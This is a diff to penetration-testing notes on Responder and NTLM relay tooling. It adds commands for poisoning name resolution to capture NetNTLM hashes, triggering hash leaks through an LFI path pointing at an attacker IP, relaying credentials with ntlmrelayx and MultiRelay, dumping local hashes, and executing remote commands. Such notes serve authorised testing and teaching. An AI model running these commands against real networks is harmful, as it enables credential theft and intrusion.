@@ -82,12 +82,14 @@ Common use: poison responses during NetNTLM authentication to capture credential
 Install:   
 
     git clone https://github.com/lgandx/Responder   
- Recon: RunFinger.py to identify hosts, OS and SMB info          
+ Recon: RunFinger.py to identify hosts, OS and SMB info. Check if SMB signing is not enabled               
  
     /opt/Responder/tools $ python3 RunFinger.py -i 172.16.1.1/24       
- Usage:   
+ Responder Usage:   
+ Config file: edit responder.conf to disable SMB / HTTP servers, change RespondTo arguement to target a specific host     
 
      sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.               
+     sudo responder.py -I eth0 -A    #analyze / listen mode, no active poisoning    
     
 You might be able to use a LFI vulnerability to request a resource and capture a hash using Responder. Ex - http://site.com/?page=//10.10.14.25/somefile           
 Captured hashes will be stored in the logs folder, in a .txt file named for the protocol hash type and IP captured from.      
@@ -106,4 +108,5 @@ Use NTLMRelay or MultiRelay to relay the credentials to any SMB server which has
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)      
 
-    /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay all auth requests, dump local account hashes   
+    /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
+    /opt/Responder/tools $ python3 MultiRelay.py -t 10.10.10.10 -c "whoami"   #exec a command    
